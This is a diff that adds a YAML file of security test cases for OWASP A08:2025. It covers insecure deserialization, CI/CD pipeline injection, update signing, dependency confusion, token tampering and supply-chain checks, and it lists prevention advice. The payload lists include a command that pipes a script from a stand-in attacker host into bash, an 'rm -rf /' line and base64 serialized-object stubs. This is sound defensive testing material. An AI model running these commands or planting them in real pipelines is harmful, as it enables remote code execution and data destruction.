@@ -1,0 +1,152 @@
+# A08:2025 - Software and Data Integrity Failures Test Cases
+# CI/CD, Updates, and Serialization
+
+test_category: "A08-software-data-integrity"
+owasp_2025: "A08"
+severity: "CRITICAL"
+cwe: "CWE-502"
+
+test_cases:
+  - id: "INTEGRITY-001"
+    name: "Insecure Deserialization"
+    description: "Test for unsafe object deserialization"
+    languages:
+      java: "ysoserial payloads"
+      python: "Pickle exploits"
+      php: "unserialize() exploits"
+      dotnet: "BinaryFormatter gadgets"
+    test_steps:
+      - "Identify serialized data (base64, hex patterns)"
+      - "Inject malicious serialized objects"
+      - "Trigger RCE via deserialization"
+    payloads:
+      - "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ== (Java)"
+      - "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NDoicm9sZSI7czo1OiJhZG1pbiI7fQ== (PHP)"
+    vulnerable_result: "RCE via crafted serialized object"
+    reference_payload_file: "payloads/deserialization/insecure-deserialization.yaml"
+    
+  - id: "INTEGRITY-002"
+    name: "CI/CD Pipeline Injection"
+    description: "Test for code injection in build/deployment"
+    test_steps:
+      - "Modify .gitlab-ci.yml or .github/workflows"
+      - "Inject commands in build scripts"
+      - "Test webhook payload injection"
+    payloads:
+      - "script: |\\n  rm -rf / #"
+      - "run: curl http://attacker.com/shell.sh | bash"
+    vulnerable_result: "Arbitrary code execution in CI/CD"
+    
+  - id: "INTEGRITY-003"
+    name: "Unsigned/Unverified Updates"
+    description: "Test for insecure auto-update mechanisms"
+    test_steps:
+      - "MITM update requests"
+      - "Serve malicious update package"
+      - "Check for signature verification"
+    checks:
+      - "HTTPS for update channel"
+      - "Digital signature verification"
+      - "Checksum validation"
+    expected_result: "Updates rejected if unsigned or modified"
+    vulnerable_result: "Accepts unsigned or tampered updates"
+    
+  - id: "INTEGRITY-004"
+    name: "Dependency Confusion"
+    description: "Test for internal package name conflicts"
+    test_steps:
+      - "Upload package with internal name to public repo"
+      - "Wait for auto-install from public instead of private"
+    targets:
+      - "npm packages"
+      - "PyPI packages"
+      - "Maven artifacts"
+    vulnerable_result: "Public package installed over private"
+    
+  - id: "INTEGRITY-005"
+    name: "Tampering with Cookies/Tokens"
+    description: "Modify JWT, session cookies without detection"
+    test_steps:
+      - "Decode JWT, modify claims"
+      - "Try 'none' algorithm"
+      - "Change session cookie values"
+    payloads:
+      - "alg: none in JWT header"
+      - "Change role=admin in JWT payload"
+      - "Modify session cookie serialization"
+    expected_result: "Signature validation fails"
+    vulnerable_result: "Modified tokens accepted"
+    
+  - id: "INTEGRITY-006"
+    name: "CDN/External Resource Integrity"
+    description: "Test for missing Subresource Integrity (SRI)"
+    test_steps:
+      - "Check <script> and <link> tags for integrity attribute"
+      - "Verify SRI hashes match actual resources"
+    example:
+      vulnerable: "<script src='https://cdn.example.com/lib.js'></script>"
+      secure: "<script src='https://cdn.example.com/lib.js' integrity='sha384-...'></script>"
+    vulnerable_result: "Missing SRI allows CDN compromise"
+    
+  - id: "INTEGRITY-007"
+    name: "Docker Image Tampering"
+    description: "Test for unsigned/unverified container images"
+    test_steps:
+      - "Check for image signature (Docker Content Trust)"
+      - "Verify base image integrity"
+      - "Test for privilege escalation in containers"
+    checks:
+      - "DOCKER_CONTENT_TRUST enabled"
+      - "Images pulled from trusted registries"
+      - "Vulnerability scanning in CI/CD"
+    vulnerable_result: "Unsigned images accepted"
+    
+  - id: "INTEGRITY-008"
+    name: "Code Repository Compromise"
+    description: "Test for unauthorized code changes"
+    test_steps:
+      - "Check for unsigned commits"
+      - "Test branch protection rules"
+      - "Verify code review requirements"
+    checks:
+      - "GPG signed commits required"
+      - "Branch protection on main/master"
+      - "CODEOWNERS file enforced"
+    vulnerable_result: "Unsigned commits accepted, no reviews"
+
+attack_vectors:
+  deserialization:
+    - "Java: ysoserial gadgets (CommonsCollections)"
+    - "Python: Pickle arbitrary code execution"
+    - "PHP: unserialize + POP chains"
+    - ".NET: BinaryFormatter exploits"
+  
+  supply_chain:
+    - "Dependency confusion"
+    - "Typosquatting"
+    - "Malicious packages"
+    - "Compromised maintainer accounts"
+  
+  ci_cd:
+    - "Pipeline injection"
+    - "Secret exposure"
+    - "Build artifact tampering"
+    - "Runner compromise"
+
+prevention:
+  - "Never deserialize untrusted data"
+  - "Use safe formats (JSON) instead of serialization"
+  - "Sign all code commits (GPG)"
+  - "Verify update signatures"
+  - "Use SRI for external resources"
+  - "Lock dependency versions"
+  - "SBOM generation and tracking"
+  - "Container image signing (Cosign)"
+  - "CI/CD secret scanning"
+
+references:
+  - "OWASP Top 10:2025 A08"
+  - "CWE-502: Deserialization of Untrusted Data"
+  - "CWE-494: Download of Code Without Integrity Check"
+  - "SLSA Framework (Supply-chain Levels)"
+  - "Sigstore (Cosign, Rekor)"
